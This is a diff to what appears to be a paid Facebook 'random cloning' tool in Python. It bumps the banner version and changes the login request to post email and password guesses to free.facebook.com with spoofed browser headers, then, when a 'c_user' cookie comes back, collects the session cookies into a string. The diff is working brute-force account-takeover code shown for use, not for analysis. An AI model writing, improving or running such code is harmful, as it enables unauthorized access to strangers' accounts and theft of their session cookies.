@@ -137,7 +137,7 @@ logo=(f"""
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m●\x1b[38;5;46mMr.Roton
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m●\x1b[38;5;46mMr.Roton
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.3
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.4
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ●\x1b[38;5;46mRandom Cloning
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ●\x1b[38;5;46mPaid
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
@@ -217,27 +217,27 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = { 'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'dpr': '2.700000047683716',
-    'referer': 'https://www.google.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Opera";v="98"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5749.199", "Opera";v="98.0.4072.63"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"POCO M2 Pro"',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro,
-    'viewport-width': '980',}
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            header_freefb = { 'authority': 'm.facebook.com',
+  		  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+   		 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+ 		   'cache-control': 'max-age=0',
+  		  'dpr': '2.700000047683716',
+  		  'referer': 'https://www.google.com/',
+   		 'sec-ch-prefers-color-scheme': 'light',
+  		  'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Opera";v="98"',
+ 		   'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5749.199", "Opera";v="98.0.4072.63"',
+  		  'sec-ch-ua-mobile': '?0',
+ 		   'sec-ch-ua-model': '"POCO M2 Pro"',
+		    'sec-ch-ua-platform': '"Windows"',
+   		 'sec-ch-ua-platform-version': '""',
+  		  'sec-fetch-dest': 'document',
+		    'sec-fetch-mode': 'navigate',
+  		  'sec-fetch-site': 'cross-site',
+ 		   'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+		    'user-agent': pro,
+ 		   'viewport-width': '980',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
